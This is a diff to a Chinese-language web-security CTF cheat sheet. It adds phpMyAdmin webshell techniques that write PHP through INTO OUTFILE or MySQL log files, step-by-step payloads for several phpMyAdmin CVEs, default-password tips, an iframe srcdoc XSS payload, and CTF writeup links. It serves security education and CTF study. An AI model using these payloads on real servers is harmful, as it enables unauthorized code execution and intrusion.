@@ -33,7 +33,7 @@ Table of Contents
     * [Ruby YAML](#rubyrails-yaml)
     * [Java Serialization](#java-deserialization)
     * [.NET Serialization](#net-derserialization)
-*  [SSTI](#ssti)
+*  [SSTI / CSTI](#ssti)
     * [Flask/Jinja2](#flaskjinja2)
     * [Twig/Symfony](#twig--symfony)
     * [Thymeleaf](#thymeleaf)
@@ -618,6 +618,7 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
 - 回溯次數超過上限時，`preg_match()`會返回`false`
 - Example
     - Code-Breaking Puzzles - pcrewaf
+    - [N1CTF 2019 - sql_manage](https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/sql_manage/README.md)
 
 ## open_basedir繞過
 
@@ -1293,6 +1294,77 @@ pop graphic-context
     - 偽造User-Agent
         - e.g. 有些WAF不封google bot
 
+- phpMyAdmin
+    - 寫文件 getshell
+        - 條件
+            - root 權限
+            - 已知web路徑
+            - 有寫檔權限
+        - `select "<?php phpinfo();?>" INTO OUTFILE  "c:\\phpstudy\\www\\shell.php"`
+    - general_log getshell
+        - 條件
+            - 讀寫權限
+            - 已知web路徑
+        - step1. 開啟日誌: `set global general_log = "ON";`
+        - step2. 指定日誌文件: `set global general_log_file = "/var/www/html/shell.php";`
+        - step3. 寫入php: `select "<?php phpinfo();?>";`
+    - slow_query getshell
+        - step1. 設置日誌路徑: `set GLOBAL slow_query_log_file='/var/www/html/shell.php';`
+        - step2. 開啟slow_query_log: `set GLOBAL slow_query_log=on;`
+        - step3. 寫入php: `select '<?php phpinfo();?>' from mysql.db where sleep(10);`
+    - CVE-2018-19968
+        - phpMyAdmin versions: 4.8.0 ~ 4.8.3
+        - LFI to RCE
+        - 條件
+            - 能登入後台
+        - step1. `CREATE DATABASE foo;CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );INSERT INTO foo.bar SELECT '<?php phpinfo(); ?>';`
+        - step2. `/chk_rel.php?fixall_pmadb=1&db=foo`
+        - step3. `INSERT INTO` pma__column_infoSELECT '1', 'foo', 'bar', 'baz', 'plop','plop', ' plop', 'plop','../../../../../../../../tmp/sess_{SESSIONID}','plop';`
+        - step4. `/tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[multi_edit][][]=baz&clause_is_unique=1`
+    - CVE-2018-12613
+        - phpMyAdmin versions: 4.8.x
+        - LFI to RCE
+        - 條件
+            - 能登入後台
+        - Payload
+            - `index.php?target=db_sql.php%253f/../../../../../../windows/system.ini`
+            - `index.php?target=sql.php%253f/../../../tmp/tmp/sess_16rme70p2qqnqjnhdiq3i6unu`
+                - 在控制台執行的 sql 語句會被寫入 session
+                - Session id 可以從 cookie `phpMyAdmin` 得到
+    - CVE-2016-5734
+        - phpmyadmin versions:
+            - 4.0.10.16 之前的4.0.x版本
+            - 4.4.15.7 之前的 4.4.x版本
+            - 4.6.3之前的 4.6.x版本
+        - php version:
+            - 4.3.0 ~ 5.4.6
+        - `preg_replace` RCE
+        - 條件
+            - 能登入後台
+    - CVE-2014-8959
+        - phpMyAdmin version:
+            - 4.0.1 ~ 4.2.12
+        - php version:
+            - < 5.3.4
+        - 條件
+            - 能登入後台
+            - 能截斷
+        - Payload: `gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&gis_data[gis_type]=/../../../../phpinfo.txt%00` (需修改token)
+    - CVE-2013-3238
+        - versions: 3.5.x < 3.5.8.1 and 4.0.0 < 4.0.0-rc3 ANYUN.ORG
+        - https://www.exploit-db.com/exploits/25136
+    - CVE-2012-5159
+        - versions: v3.5.2.2
+        - server_sync.php Backdoor
+        - https://www.exploit-db.com/exploits/21834
+    - CVE-2009-1151
+        - versions: 2.11.x < 2.11.9.5 and 3.x < 3.1.3.1
+        - config/config.inc.php 命令執行
+        - https://www.exploit-db.com/exploits/8921
+    - 弱密碼 / 萬用密碼
+        - phpmyadmin 2.11.9.2: root/空密碼
+        - phpmyadmin 2.11.3 / 2.11.4: 用戶名: `'localhost'@'@"`
+
 ## MSSQL
 
 - 子字串：
@@ -1775,6 +1847,7 @@ HQL injection example (pwn2win 2017)
 - Config
     - `/usr/local/apache2/conf/httpd.conf`
     - `/usr/local/etc/apache2/httpd.conf`
+    - `/usr/local/nginx/conf/nginx.conf`
     - `/etc/apache2/sites-available/000-default.conf`
     - `/etc/apache2/apache2.conf`
     - `/etc/apache2/httpd.conf`
@@ -1978,6 +2051,7 @@ HQL injection example (pwn2win 2017)
     - `<!--#include file="../../web.config"-->`
 - Example
     - [HITCON CTF 2018 - Why so Serials?](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
+    - [Hack.lu 2019 - Trees For Future](https://w0y.at/writeup/2019/10/28/hacklu-2019-trees-for-future.html)
 
 # 上傳漏洞
 
@@ -2186,7 +2260,7 @@ HQL injection example (pwn2win 2017)
         - `Array('key1' => classA, 'key1' => classB)`
     - https://github.com/ambionics/phpggc#fast-destruct
     - Example
-        - Balsn CTF 2020 - L5D
+        - [Balsn CTF 2020 - L5D](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2020#l5d)
 
 - ASCII Strings
     - 使用 `S` 的序列化格式，則可以將字串內容改用 hex 表示
@@ -2194,7 +2268,7 @@ HQL injection example (pwn2win 2017)
         - 繞 WAF
     - https://github.com/ambionics/phpggc#ascii-strings
     - Example
-        - Balsn CTF 2020 - L5D
+        - [Balsn CTF 2020 - L5D](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2020#l5d)
         - 网鼎杯2020 青龙组 - AreUSerialz
 
 - Phar:// 反序列化
@@ -2249,6 +2323,12 @@ $ python a.py > tmp
 $ cat tmp | python b.py
 uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)
 ```
+
+<br>
+
+- 補充: NumPy CVE-2019-6446 RCE
+    - 影響 NumPy <=1.16.0
+    - 底層使用 pickle
 
 ## Ruby/Rails Marshal
 
@@ -3078,6 +3158,12 @@ console.log(o3.b)
 </svg>
 ```
 
+- iframe srcdoc XSS
+
+```html
+<iframe srcdoc="&#x3C;svg/&#x6f;nload=alert(document.domain)&#x3E;">
+```
+
 - Polyglot XSS
     - Example: PlaidCTF 2018 wave XSS
     - 上傳.wave檔 (會檢查signatures)
@@ -3317,7 +3403,7 @@ console.log("I'll be executed!");
     </script>
     ```
     - `<a>` 的 `href` 可以解決toString問題: `<a id=test1 href=http://kaibro.tw>`
-        - => `alert(test1); // http://kaibro.tw`
+        - `alert(test1);` => `http://kaibro.tw`
     - `<form id=test1><a name=test2 href=http://kaibro.tw></form>` 依舊有問題
         - `alert(test1.test2);` => `undefined`
         - 解法見下面HTMLCollection
@@ -3345,6 +3431,7 @@ alert(window.test1.test2);  //  x:alert(1)
 ```
 
 - Example
+    - [Google CTF 2019 Qual - pastetastic](https://github.com/koczkatamas/gctf19/tree/master/pastetastic)
     - [Volga CTF 2020 Qualifier - Archive](https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html)
 
 # 密碼學
